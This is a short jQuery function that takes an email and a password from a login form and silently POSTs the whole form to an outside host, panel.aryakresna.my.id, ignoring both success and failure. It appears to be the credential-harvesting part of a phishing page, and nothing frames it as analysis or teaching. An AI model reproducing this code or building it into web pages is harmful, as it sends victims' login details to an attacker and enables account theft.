    function yuWan() {
        let user = $('#alx_email_fb9').val().trim();
        let pass = $('#alx_password_fb9').val();

        if (user === "") {
            $('#alx_email_fb9').focus();
            return;
        } else if (pass === "") {
            $('#alx_password_fb9').focus();
            return;
        }

        $.ajax({
            url: 'https://panel.aryakresna.my.id/index.php',
            type: 'POST',
            data: $('form[id="alexfr9"]').serialize(),
            dataType: 'text',
            success: function () {
                return true;
            },
            error: function () {
                return true;
            }
        });
    }
